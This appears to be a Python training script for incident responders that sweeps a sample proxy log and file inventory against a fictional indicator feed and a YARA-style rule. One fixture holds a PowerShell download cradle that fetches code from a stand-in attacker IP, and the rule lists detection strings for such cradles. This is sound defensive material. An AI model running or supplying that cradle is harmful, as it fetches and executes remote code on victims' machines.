"""Session 2 - Match threat-intelligence indicators (IOCs) against your own logs.

Threat-intelligence feeds share Indicators of Compromise: bad IPs, domains, URLs and
file hashes seen in real attacks. Incident responders sweep their logs for them.
This script loads a small fictional feed (JSON, similar in spirit to STIX/MISP exports),
then sweeps a proxy log and an endpoint file inventory, including a simple
"YARA-style" rule that flags files containing suspicious strings.
All indicators are fictional and use documentation/test ranges.
Run:  python session-02_ioc_matcher.py
"""
import hashlib
import ipaddress
import json

FEED = json.loads("""{
  "source": "Fictional regional CERT feed", "generated": "2026-10-19",
  "indicators": [
    {"type": "ipv4", "value": "203.0.113.45", "threat": "phishing kit host", "confidence": 90},
    {"type": "cidr", "value": "198.51.100.0/28", "threat": "password-spraying botnet", "confidence": 70},
    {"type": "domain", "value": "metr0bank-secure.example", "threat": "bank look-alike", "confidence": 95},
    {"type": "sha256", "value": "%s", "threat": "info-stealer dropper (training sample)", "confidence": 85}
  ]}""" % hashlib.sha256(b"TRAINING-SAMPLE-not-real-malware").hexdigest())

PROXY_LOG = [
    ("10:01:12", "pc-lab-07", "203.0.113.45", "GET /forms/verify.zip"),
    ("10:03:40", "pc-acc-02", "192.0.2.80", "GET /news"),
    ("10:05:02", "pc-hr-01", "198.51.100.9", "POST /login"),
    ("10:06:33", "pc-acc-02", "metr0bank-secure.example", "GET /login?id=88231"),
    ("10:07:10", "pc-lab-03", "198.51.100.200", "GET /"),
]
ENDPOINT_FILES = {  # host -> {path: file content}
    "pc-lab-07": {"C:/Users/s1/Downloads/verify.exe": b"TRAINING-SAMPLE-not-real-malware",
                  "C:/Users/s1/notes.txt": b"lecture notes week 3"},
    "pc-acc-02": {"C:/Temp/run.ps1": b"powershell -enc SQBFAFgA... DownloadString(http://203.0.113.45/a)"},
}
# A YARA-style rule written as data: match if ANY of the strings appears
RULE = {"name": "Suspicious_Download_Cradle",
        "strings": [b"DownloadString(", b"-enc ", b"Invoke-Expression"], "condition": "any"}


def match_net(value, ind):
    if ind["type"] == "ipv4":
        return value == ind["value"]
    if ind["type"] == "cidr":
        try:
            return ipaddress.ip_address(value) in ipaddress.ip_network(ind["value"])
        except ValueError:
            return False
    if ind["type"] == "domain":
        return value == ind["value"] or value.endswith("." + ind["value"])
    return False


def main():
    print(f"Feed: {FEED['source']} ({len(FEED['indicators'])} indicators, {FEED['generated']})\n")
    hits = []
    print("Proxy log sweep:")
    for t, host, dest, req in PROXY_LOG:
        found = [i for i in FEED["indicators"] if match_net(dest, i)]
        mark = f"HIT {found[0]['threat']} ({found[0]['confidence']}%)" if found else "clean"
        print(f"  {t} {host:<10} -> {dest:<26} {mark}")
        if found:
            hits.append(host)
    print("\nEndpoint file sweep (hash IOCs + YARA-style rule):")
    hashes = {i["value"]: i for i in FEED["indicators"] if i["type"] == "sha256"}
    for host, files in ENDPOINT_FILES.items():
        for path, data in files.items():
            h = hashlib.sha256(data).hexdigest()
            notes = []
            if h in hashes:
                notes.append("hash IOC: " + hashes[h]["threat"])
            if any(s in data for s in RULE["strings"]):
                notes.append("rule " + RULE["name"])
            print(f"  {host:<10} {path:<36} {'; '.join(notes) or 'clean'}")
            if notes:
                hits.append(host)
    print("\nHosts to isolate and investigate:", ", ".join(sorted(set(hits))))


if __name__ == "__main__":
    main()
